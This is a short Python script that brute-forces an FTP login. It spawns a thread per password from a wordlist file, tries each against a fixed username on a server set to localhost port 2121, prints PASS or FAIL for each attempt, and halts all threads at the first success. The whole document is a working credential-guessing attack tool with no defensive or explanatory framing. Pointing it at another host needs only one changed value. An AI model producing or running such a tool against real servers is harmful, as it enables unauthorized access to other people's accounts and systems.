from ftplib import FTP
import threading
import time

ip = "localhost"
port = 2121
username = "user"

stop_event = threading.Event()
found_password = None

with open("word.txt", "r") as f:
    passwords = [line.strip() for line in f]

def ftp_test(ip, port, username, password):
    global found_password

    # Stop early if another thread already succeeded
    if stop_event.is_set():
        return

    try:
        ftp = FTP()
        ftp.connect(ip, port, timeout=5)
        ftp.login(username, password)

        print(f"[PASS] {password}")

        found_password = password
        stop_event.set()     # SIGNAL ALL THREADS TO STOP

        ftp.quit()

    except:
        print(f"[FAIL] {password}")

threads = []

for password in passwords:

    # Stop launching new threads if success happened
    if stop_event.is_set():
        break

    t = threading.Thread(target=ftp_test, args=(ip, port, username, password))
    threads.append(t)
    t.start()

    time.sleep(0.01)   # throttle connections (important)

for t in threads:
    t.join()

print("Final result:", found_password)
